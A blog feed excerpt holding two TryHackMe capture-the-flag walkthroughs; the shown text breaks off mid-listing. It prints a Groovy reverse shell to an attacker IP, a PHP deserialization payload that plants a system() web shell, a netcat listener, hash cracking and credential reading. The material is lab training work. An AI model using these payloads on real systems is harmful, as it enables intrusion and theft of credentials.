/etc/passwd\u0026#34; def proc = command.execute() proc.waitFor() println \u0026#34;Std Out: ${proc.in.text}\u0026#34;   The above doesn\u0026rsquo;t work due to some reason for reverse shell. We can use the following snippet from this gist.\n1 2 3 4  String host=\u0026#34;10.17.0.120\u0026#34;; int port=4444; String cmd=\u0026#34;/bin/bash\u0026#34;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()\u0026gt;0)so.write(pi.read());while(pe.available()\u0026gt;0)so.write(pe.read());while(si.available()\u0026gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();   Got shell!\nEnumerating the container found /opt/note.txt. It contained the following:\n1 2 3 4 5 6 7 8  jenkins@jenkins:/opt$ cat note.txt cat note.txt Aubreanna, Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here. Use them if you need access to the root user account. root:...   Getting root! Now, let\u0026rsquo;s try the following credentials as the root user.\n1 2 3 4 5 6 7 8  www-data@internal:/tmp$ su - root Password: root@internal:~# root@internal:~# id uid=0(root) gid=0(root) groups=0(root) root@internal:~# head /etc/shadow root:...:18477:0:99999:7::: daemon:*:18295:0:99999:7:::   r00t! This machine was purely based on enumeration. Hopefully, you enjoyed reading the walkthrough!\n","description":"Walkthrough of the machine Internal on TryHackMe - https://tryhackme.com/room/internal","id":2,"section":"posts","tags":["tryhackme","ssh","http","nmap","gobuster","wpscan","bruteforcing","rce","privesc","jenkins","groovy"],"title":"TryHackMe - Internal","uri":"https://umar0x01.sh/posts/internal-thm/"},{"content":"Enumeration IP: 10.10.51.225\nWe can scan the host using rustscan (like nmap; but faster!) for open ports:\n1  rustscan -a 10.10.51.225 --timeout 5000 --tries 2 --ulimit 5000 -- -sC -sV    -a specifies the Host IP address --timeout specifies the timeout before saying the port is closed --tries how many times to try and connect to the port --ulimit specifies how many sockets to open at a time -- for passing arguments for nmap -sC -sV nmap arguments telling rustscan to run default scripts and version fingerprinting  Scan results:\nAlright, so, we\u0026rsquo;ve found 2 open ports. 22 and 80.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92  ┌──(root💀b0x)-[~/Downloads] [95/999] └─# rustscan -a 10.10.51.225 --timeout 5000 --tries 2 --ulimit 5000 -- -sC -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\  }/ /\\  \\| |\\  | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : https://discord.gg/GFrQsGy : : https://github.com/RustScan/RustScan : -------------------------------------- Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; [~] Automatically increasing ulimit value to 5000. Open 10.10.51.225:22 Open 10.10.51.225:80 [~] Starting Script(s) [\u0026gt;] Script to be run Some(\u0026#34;nmap -vvv -p {{port}} {{ip}}\u0026#34;) [~] Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-03 13:04 PKT NSE: Loaded 153 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 13:04 Completed NSE at 13:04, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 13:04 Completed NSE at 13:04, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 13:04 Completed NSE at 13:04, 0.00s elapsed Initiating Ping Scan at 13:04 Scanning 10.10.51.225 [4 ports] Completed Ping Scan at 13:04, 0.34s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 13:04 Completed Parallel DNS resolution of 1 host. at 13:04, 0.01s elapsed DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 13:04 Scanning 10.10.51.225 [2 ports] Discovered open port 80/tcp on 10.10.51.225 Discovered open port 22/tcp on 10.10.51.225 Completed SYN Stealth Scan at 13:04, 0.25s elapsed (2 total ports) Initiating Service scan at 13:04 Scanning 2 services on 10.10.51.225 Completed Service scan at 13:05, 6.52s elapsed (2 services on 1 host) NSE: Script scanning 10.10.51.225. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 13:05 Completed NSE at 13:05, 6.38s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 13:05 Completed NSE at 13:05, 0.82s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 13:05 Completed NSE at 13:05, 0.00s elapsed Nmap scan report for 10.10.51.225 Host is up, received reset ttl 60 (0.28s latency). Scanned at 2021-04-03 13:04:58 PKT for 14s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 60 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 44:ee:1e:ba:07:2a:54:69:ff:11:e3:49:d7:db:a9:01 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDar9Wvsxi0NTtlrjfNnap7o6OD9e/Eug2nZF18xx17tNZC/iVn5eByde27ZzR4Gf10FwleJzW5B7ieEThO3Ry5/kMZYbobY2nI8F3s20R8+sb6IdWDL4NIkFPqsDudH3LORxECx0DtwNdqgMgqeh/fCys1BzU2v2MvP5alraQmX 81h1AMDQPTo9nDHEJ6bc4Tt5NyoMZZSUXDfJRutsmt969AROoyDsoJOrkwdRUmYHrPqA5fvLtWsWXHYKGsWOPZSe0HIq4wUthMf65RQynFQRwErrJlQmOIKjMV9XkmWQ8c/DqA1h7xKtbfeUYa9nEfhO4HoSkwS0lCErj+l9p8h | 256 8b:2a:8f:d8:40:95:33:d5:fa:7a:40:6a:7f:29:e4:03 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA7IA5s8W9jhxGAF1s4Q4BNSu1A52E+rSyFGBYdecgcJJ/sNZ3uL6sjZEsAfJG83m22c0HgoePkuWrkdK2oRnbs= | 256 65:59:e4:40:2a:c2:d7:05:77:b3:af:60:da💿fc:67 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGXyfw0mC4ho9k8bd+n0BpaYrda6qT2eI1pi8TBYXKMb 80/tcp open http syn-ack ttl 60 Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: OPTIONS GET HEAD POST |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel NSE: Script Post-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 13:05 Completed NSE at 13:05, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 13:05 Completed NSE at 13:05, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 13:05 Completed NSE at 13:05, 0.00s elapsed Read data files from: /usr/bin/../share/nmap Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 14.76 seconds Raw packets sent: 6 (240B) | Rcvd: 3 (128B)   SSH (Port 22) Let\u0026rsquo;s go with the waterfall mechanism and first enumerate port 22. We can try credentials bruteforcing using BruteX and check the version for any vulnerabilities which are public and exploitable.\nFrom googling the exact banner/version, we can see that the specific version is vulnerable to username enumeration\n\u0026ndash;\nLet\u0026rsquo;s try and do it using metasploit\u0026rsquo;s module.\nWe can search for the module using search with an filter of port:22 for only searching for everything written for SSH/Port22 with enum\n1  search port:22 ssh_enum   \u0026ndash;\nLet\u0026rsquo;s run it.\n\u0026ndash;\nWe can see that it enumerated the user root and can probably guess the password will be something really long. Let\u0026rsquo;s goto port 80 for now and we\u0026rsquo;ll come back to SSH if we need something.\nHTTP (Port 80) Let\u0026rsquo;s browse the application to get an idea in which programming language it was written, what\u0026rsquo;s it\u0026rsquo;s using as it\u0026rsquo;s backend server, etc.\n1  http://10.10.51.225/   So, we get meeted with Apache2\u0026rsquo;s default installation page. Let\u0026rsquo;s try and see if /robots.txt has something in it.\n1  http://10.10.51.225/robots.txt   Sadly, it doesn\u0026rsquo;t exist either.\n\u0026ndash;\nWe can now utilize gobuster or dirsearch to enumerate the hidden directories hosted on the web application.\nI\u0026rsquo;ll use dirsearch to save some time downloading and setting up gobuster.\n1  python3 dirsearch.py -u http://10.10.51.225 -e all -t 100   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47  ┌──(root💀b0x)-[~/tools/dirsearch] └─# python3 dirsearch.py -u http://10.10.51.225 -e all -t 100 1 ⨯ /mnt/hgfs/tools/dirsearch/thirdparty/requests/__init__.py:91: RequestsDependencyWarning: urllib3 (1.26.2) or chardet (4.0.0) doesn\u0026#39;t match a supported version! warnings.warn(\u0026#34;urllib3 ({}) or chardet ({}) doesn\u0026#39;t match a supported \u0026#34; _|. _ _ _ _ _ _|_ v0.4.1 (_||| _) (/_(_|| (_| ) Extensions: all | HTTP method: GET | Threads: 100 | Wordlist size: 8948 Error Log: /mnt/hgfs/tools/dirsearch/logs/errors-21-04-03_13-30-02.log Target: http://10.10.51.225/ Output File: /mnt/hgfs/tools/dirsearch/reports/10.10.51.225/_21-04-03_13-30-03.txt [13:30:03] Starting: [13:30:16] 403 - 277B - /.ht_wsr.txt [13:30:17] 403 - 277B - /.htaccessOLD [13:30:17] 403 - 277B - /.htaccess_orig [13:30:17] 403 - 277B - /.htaccess_sc [13:30:17] 403 - 277B - /.htaccessBAK [13:30:17] 403 - 277B - /.htaccess_extra [13:30:17] 403 - 277B - /.htaccessOLD2 [13:30:17] 403 - 277B - /.htm [13:30:17] 403 - 277B - /.htpasswd_test [13:30:17] 403 - 277B - /.html [13:30:17] 403 - 277B - /.httr-oauth [13:30:17] 403 - 277B - /.htpasswds [13:30:18] 403 - 277B - /.htaccess.sample [13:30:19] 403 - 277B - /.htaccess.save [13:30:19] 403 - 277B - /.htaccess.bak1 [13:30:19] 403 - 277B - /.htaccess.orig [13:30:20] 403 - 277B - /.php3 [13:30:21] 403 - 277B - /.php [13:30:35] 301 - 313B - /backup -\u0026gt; http://10.10.51.225/backup/ [13:30:36] 200 - 2KB - /backup/ [13:30:45] 200 - 11KB - /index.html [13:30:46] 301 - 317B - /javascript -\u0026gt; http://10.10.51.225/javascript/ [13:30:46] 200 - 6KB - /index.php [13:30:46] 200 - 6KB - /index.php/login/ [13:31:02] 200 - 2KB - /readme.md [13:31:03] 403 - 277B - /server-status/ [13:31:03] 403 - 277B - /server-status Task Completed   \u0026ndash;\nAlright, we can see /backup/ directory and /readme.md which also seems kinda interesting. Let\u0026rsquo;s visit these and see what\u0026rsquo;s hosted in them.\n1  http://10.10.51.225/readme.md   Let\u0026rsquo;s cURL it.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37  $~ curl -i http://10.10.51.225/readme.md # Welcome to Base  A super simple, responsive framework built to work on mobile devices, tablets, netbooks and desktop computers. ## Reasons to use base for your next web project ### Responsive Design Built for all devices big and small, base has got you covered. ### Foundation Styles Custom styles for headings, tables, blockquotes forms and much more. ### Accessibility in mind Works with screen readers in mind and has JS fallbacks. ### Easy to learn Well commented CSS to ensure your implementation is a breeze. ### Cross-Browser Covers IE7+ and modern browsers such as Chrome, Firefox and Opera. ### Base is Awesome! Preview the [demo page](http://matthewhartman.github.com/base/demo/) to see the Base Framework in all its glory! :) ## Repo Contents 1. readme.md - Feel free to delete this! ;) 2. index.html - An example page with Base in action 3. style.css - Base stylesheet including styles for headings, tables, body content, etc 4. default.js - Base javascript file to get you started Base was built by Matthew Hartman (@hartmanmatthew), a passionate front end developer based in Melbourne, Australia. ## Thank You / Credits - Mark Otto (@mdo) \u0026amp; Jacob Thornton (@fat) for some base styles taken from BootStrap - Nicolas Gallagher (@necolas) for the Micro ClearFix :)   We can see that it returns README.md source of some repository, maybe we can explore it later?\nFor now, let\u0026rsquo;s move to the /backup/ folder\n1  http://10.10.51.225/backup/   The /backup/ directory contains interesting .bak files, let\u0026rsquo;s cURL those one by one and see their source code.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  ┌──(root💀b0x)-[~/tools/dirsearch] └─# curl -i http://10.10.51.225/backup/index.html.bak HTTP/1.1 200 OK Date: Sat, 03 Apr 2021 08:36:44 GMT Server: Apache/2.4.18 (Ubuntu) Last-Modified: Wed, 10 Mar 2021 01:10:05 GMT ETag: \u0026#34;2c39-5bd2453bf4a05\u0026#34; Accept-Ranges: bytes Content-Length: 11321 Content-Type: application/x-trash \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD XHTML 1.0 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\u0026#34;\u0026gt; \u0026lt;html xmlns=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt; \u0026lt;!-- Modified from the Debian original for Ubuntu Last updated: 2014-03-19 See: https://launchpad.net/bugs/1288690 --\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Apache2 Ubuntu Default Page: It works\u0026lt;/title\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34; media=\u0026#34;screen\u0026#34;\u0026gt; * { margin: 0px 0px 0px 0px; padding: 0px 0px 0px 0px; } body, html { padding: 3px 3px 3px 3px; background-color: #D8DBE2; font-family: Verdana, sans-serif; font-size: 11pt; text-align: center; } div.main_page {   We can see that the page also points to default Apache installation page. Let\u0026rsquo;s try .php.bak file now.\nI\u0026rsquo;ll be downloading and analysing it in Sublime text (text editor).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ┌──(root💀b0x)-[~/tools/dirsearch] └─# curl http://10.10.51.225/backup/index.php.bak -O % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 6399 100 6399 0 0 10438 0 --:--:-- --:--:-- --:--:-- 10438 ┌──(root💀b0x)-[~/tools/dirsearch] └─# ┌──(root💀b0x)-[~/tools/dirsearch] └─# head index.php.bak \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34; class=\u0026#34;no-js\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Base\u0026lt;/title\u0026gt; \u0026lt;meta name=\u0026#34;description\u0026#34; content=\u0026#34;\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, minimum-scale=1.0, maximum-scale=1.0\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; media=\u0026#34;screen\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt;   \u0026ndash;\nIn the heading, we can see that it too points to the same framework Base which was discussed above in the README.md file, let\u0026rsquo;s try searching this framework.\nSo, the guy has deleted this repository (base) from his github account. Maybe shifted somewhere else? Let\u0026rsquo;s try searching it on google rather than using the link from readme.md file.\nSeeing the readme.md contents again, we can probably deduce that this framework (if used) is only going to be used for styling. Since, it doesn\u0026rsquo;t mention anywhere in the README.md file that there is any PHP code in it.\n\u0026ndash;\nWe can continue reading the source code of the index.php.bak file for now.\n\u0026ndash;\nWe can see on line 216 \u0026ndash; 220. We can just input a $_GET['debug'] debug parameter with serialize input and the source code will unserialize it.\nWe know that the code is vulnerable to PHP Deserialization but how to exploi this? We only have the .bak file and this won\u0026rsquo;t execute/render as PHP on the server.\nWere there any hidden directories we missed while the enumeration?\nYes! we didn\u0026rsquo;t discuss /index.php file, let\u0026rsquo;s try accessing it.\nThe page looks something like this:\n\u0026ndash;\nExploitation Alright, now time for the exploitation. Before that, we need to learn what PHP deserialization is and before that, what is serialization?\nWe use serialization when we want a piece of code or some object to be stored in a database or when we\u0026rsquo;re expecting some piece of code through an API call or something and then we want to execute it/load it.\nIf you\u0026rsquo;re a programmer, you might have come across this hurdle, to solve this, you always need to create a new file, write the source code in it and execute the file manually.\nTo not do the above^, we use serialization, it takes your piece of code/object, serializes it and stores in the database and while retreiving it, it unserializes the piece of code and executes it.\nFor the API call, it just receieves serialized code already and executes it while unserializing it.\nNote: It is always recommended to never take any input either through database or through APIs or any files on the system and mostly don\u0026rsquo;t even use deserialization if not really required. If it\u0026rsquo;s required, never let the user control the parameters!\nP.S ~ The above information about serialization is generic and not only based on PHP de(serialization)!\nYou can find more details in this youtube video created by a friend of mine; Mukarram Khalid.\nSo, now that we\u0026rsquo;ve a base understanding of what serialization is, let\u0026rsquo;s move to the source code and see what we can exploit here.\nWe can see that the PHP code is using a magic function (i.e. __destruct())\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  \u0026lt;?php class FormSubmit { public $form_file = \u0026#39;message.txt\u0026#39;; public $message = \u0026#39;\u0026#39;; public function SaveMessage() { $NameArea = $_GET[\u0026#39;name\u0026#39;]; $EmailArea = $_GET[\u0026#39;email\u0026#39;]; $TextArea = $_GET[\u0026#39;comments\u0026#39;]; $this-\u0026gt; message = \u0026#34;Message From : \u0026#34; . $NameArea . \u0026#34; || From Email : \u0026#34; . $EmailArea . \u0026#34; || Comment : \u0026#34; . $TextArea . \u0026#34;\\n\u0026#34;; } public function __destruct() { file_put_contents(__DIR__ . \u0026#39;/\u0026#39; . $this-\u0026gt;form_file,$this-\u0026gt;message,FILE_APPEND); echo \u0026#39;Your submission has been successfully saved!\u0026#39;; } }   \u0026ndash;\nWhat is __destruct? __destruct magic method is used to always run or do a task at the end of the execution. Let\u0026rsquo;s say we want to do something everytime (maybe update a local log file?), it\u0026rsquo;ll do that in the end of the execution.\nWhat is it doing in the above application?\n1 2 3 4 5 6  public function __destruct() { file_put_contents(__DIR__ . \u0026#39;/\u0026#39; . $this-\u0026gt;form_file,$this-\u0026gt;message,FILE_APPEND); echo \u0026#39;Your submission has been successfully saved!\u0026#39;; }    It\u0026rsquo;s creating a file in our __DIR__ (or pwd) in the directory and with the message whatever is specified (using the two properties being used from the class) It then echo\u0026rsquo;s a string: \u0026lsquo;Your submission has been successfully saved\u0026rsquo;  \u0026ndash;\nNow, we can write our own code matching the above^ but just change the contents and the file name, let\u0026rsquo;s try it.\nRemember, we need to use the same class name and same properties names!\n1 2 3 4 5 6 7 8 9 10 11 12  \u0026lt;?php class FormSubmit { public $form_file = \u0026#39;umar0x01.php\u0026#39;; public $message = \u0026#39;\u0026lt;?php system($_GET[123]); ?\u0026gt;\u0026#39;; } $newObj = new FormSubmit; echo serialize($newObj); ?\u0026gt;  Let\u0026rsquo;s run add this PHP code in a local file and run it.\nAlright, we get the serialized string:\n1  O:10:\u0026#34;FormSubmit\u0026#34;:2:{s:9:\u0026#34;form_file\u0026#34;;s:12:\u0026#34;umar0x01.php\u0026#34;;s:7:\u0026#34;message\u0026#34;;s:28:\u0026#34;\u0026lt;?php system($_GET[123]); ?\u0026gt;\u0026#34;;}   Let me try and walk you through the whole serialized string.\n O means object O:10 means object name\u0026rsquo;s length (i.e. -\u0026gt; 10) 2:{ means there are two properties/attributes s:9 means that our property/attribute is a string and is of length of 9 chars s:9:\u0026quot;form_file\u0026quot;; Length of 9 and property name  Probably, that explained the serialized string. You can always google for more details!\nNow, we need to URL encode our string and pass it into the debug parameter in the application.\nFor URL encoding, I\u0026rsquo;ll use cyberchef.\nURL Encoded string looks like:\n1  O%3A10%3A%22FormSubmit%22%3A2%3A%7Bs%3A9%3A%22form%5Ffile%22%3Bs%3A12%3A%22umar0x01%2Ephp%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system%28%24%5FGET%5B123%5D%29%3B%20%3F%3E%22%3B%7D   Let\u0026rsquo;s pass this in the URL and see if our new file get\u0026rsquo;s created.\nYay! It did, the string printed in the bottom indicates that.\nHere\u0026rsquo;s the cURL request, if you\u0026rsquo;ve problems reproducing the above:\n1 2 3 4 5  curl -i \u0026#39;http://10.10.51.225/index.php?debug=O%3A10%3A%22FormSubmit%22%3A2%3A{s%3A9%3A%22form_file%22%3Bs%3A12%3A%22umar0x01.php%22%3Bs%3A7%3A%22message%22%3Bs%3A28%3A%22%3C%3Fphp%20system(%24_GET[123])%3B%20%3F%3E%22%3B}\u0026#39; --globoff \\ -H \u0026#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\u0026#39; \\ -H \u0026#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\u0026#39; \\ -H \u0026#39;Accept-Language: en-US,en;q=0.5\u0026#39; \\ -H \u0026#39;Connection: close\u0026#39;   \u0026ndash;\nNow, let\u0026rsquo;s access the .php file with our RCE code in it and get reverse shell!\n\u0026ndash;\n1  view-source:http://10.10.51.225/umar0x01.php?123=ls%20-la   \u0026ndash;\nWe can generate RCE payloads to fallback if something isn\u0026rsquo;t present utilizing reverse-shell.sh and call it with cURL.\n\u0026ndash;\nI\u0026rsquo;ll let you figure out what\u0026rsquo;s happening below, just remember that I wrote the above shell script generated in a file named shell.sh in my local directory since the machine doesn\u0026rsquo;t have access to the internet.\nReverse Shell: Now that we\u0026rsquo;ve reverse shell, let\u0026rsquo;s try and get tty shell and make it interactive!\n\u0026ndash;\nFirst, we\u0026rsquo;ll get the tty shell using python\u0026rsquo;s onliner:\n1  python3 -c \u0026#34;__import__(\u0026#39;pty\u0026#39;).spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34;   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  ┌──(root💀b0x)-[/mnt/hgfs/THM/Debug] └─# nc -nlvp 4444 listening on [any] 4444 ... connect to [10.17.0.120] from (UNKNOWN) [10.10.51.225] 50224 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ which python /usr/bin/python $ which python3 /usr/bin/python3 $ python3 -c \u0026#34;__import__(\u0026#39;pty\u0026#39;).spawn(\u0026#39;/bin/bash\u0026#39;)\u0026#34; www-data@osboxes:/var/www/html$www-data@osboxes:/var/www/html$id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@osboxes:/var/www/html$www-data@osboxes:/var/www/html$  \u0026ndash;\nNow that we\u0026rsquo;ve tty shell, let\u0026rsquo;s make it interactive (i.e. Ctrl + C or other things don\u0026rsquo;t exit the shell!)\nNote: We need bash shell to make it interactive!\nType: \u0026lsquo;Ctrl + Z\u0026rsquo; and background the process.\nNow we\u0026rsquo;ll use:\n1  stty raw -echo   And then type fg to foreground the process (get it back)\n\u0026ndash;\nNow that we\u0026rsquo;ve interactive shell, let\u0026rsquo;s add the rows/cols (generic) and add some colors UwU!\n1 2 3 4 5 6 7 8  PS1=\u0026#39;${debian_chroot:+($debian_chroot)}\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ \u0026#39; # green alias ls=\u0026#39;ls --color=auto\u0026#39; alias grep=\u0026#39;grep --color=auto\u0026#39; alias fgrep=\u0026#39;fgrep --color=auto\u0026#39; alias egrep=\u0026#39;egrep --color=auto\u0026#39; alias ll=\u0026#39;ls -alFh\u0026#39; alias la=\u0026#39;ls -A\u0026#39; alias l=\u0026#39;ls -CF\u0026#39;   \u0026ndash;\n1 2 3  stty rows 48 stty columns 211 export TERM=screen   \u0026ndash;\nAlright, we got the initial shell and it\u0026rsquo;s fully interactive! Time to get the initial flag and privesc our way to root!\n\u0026ndash;\nWe can find a .htpasswd (usually used for HTTP authentication) file right in /var/www/html/ containing the following credentials:\n1 2  www-data@osboxes:/var/www/html$ cat .htpasswd james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1   Let\u0026rsquo;s run john and try to crack these.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  ┌──(root💀b0x)-[/mnt/hgfs/THM/Debug] └─# john htpasswd.hash Warning: detected hash type \u0026#34;md5crypt\u0026#34;, but the string is also recognized as \u0026#34;md5crypt-long\u0026#34; Use the \u0026#34;--format=md5crypt-long\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 4 OpenMP threads Proceeding with single, rules:Single Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Almost done: Processing the remaining buffered candidate passwords, if any. Warning: Only 84 candidates buffered for the current salt, minimum 96 needed for performance. Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist jamaica (james) 1g 0:00:00:00 DONE 2/3 (2021-04-03 14:42) 20.00g/s 41760p/s 41760c/s 41760C/s bigdog..88888888 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed   \u0026ndash;\nWe get a password: jamaica\nWhere can we use it? Let\u0026rsquo;s see /etc/passwd file if it contains any other users except for www-data and root\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  www-data@osboxes:/var/www/html$ cat /etc/passwd root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog❌104:108::/home/syslog:/bin/false _apt❌105:65534::/nonexistent:/bin/false messagebus❌106:110::/var/run/dbus:/bin/false uuidd❌107:111::/run/uuidd:/bin/false lightdm❌108:114:Light Display Manager:/var/lib/lightdm:/bin/false whoopsie❌109:117::/nonexistent:/bin/false avahi-autoipd❌110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi❌111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false dnsmasq❌112:65534:dnsmasq,,,:/var/lib/misc:/bin/false colord❌113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false speech-dispatcher❌114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false hplip❌115:7:HPLIP system user,,,:/var/run/hplip:/bin/false kernoops❌116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse❌117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit❌118:126:RealtimeKit,,,:/proc:/bin/false saned❌119:127::/var/lib/saned:/bin/false usbmux❌120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false james❌1001:1001::/home/james:/bin/bash sshd❌121:65534::/var/run/sshd:/usr/sbin/nologin   Alright, we can try the credentials against the user: james\n\u0026ndash;\nFlag (user.txt) \u0026ndash;\nTime for privesc!\nPrivileges Escalation Before running LinEnum, LSE or LinPeas, let\u0026rsquo;s try and do some manual enumeration first!\n\u0026ndash;\nLet\u0026rsquo;s try and get the list of binaries we can run with sudo!\n1 2 3  james@osboxes:~$ sudo -l [sudo] password for james: Sorry, user james may not run sudo on osboxes.   Nothing we can run with sudo! :(\n\u0026ndash;\nLet\u0026rsquo;s try and list the crontabs (if any)\n1 2  james@osboxes:~$ crontab -l no crontab for james   Nothing there as well!\n\u0026ndash;\nWe can see that .bash_history is present in the directry, let\u0026rsquo;s check it out.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 